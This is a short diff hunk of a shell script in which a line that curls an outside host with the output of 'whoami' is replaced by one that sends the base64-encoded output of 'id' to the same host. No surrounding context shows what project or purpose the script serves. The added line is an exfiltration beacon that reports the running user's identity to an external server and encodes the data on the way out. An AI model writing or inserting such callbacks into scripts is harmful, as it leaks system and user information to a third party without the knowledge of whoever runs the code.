@@ -8,4 +8,4 @@
 
 #!/bin/sh
 
-curl https://im5.org/hello?c=`whoami`
+curl "https://im5.org/hello?d=$(echo -n `id` |base64)"
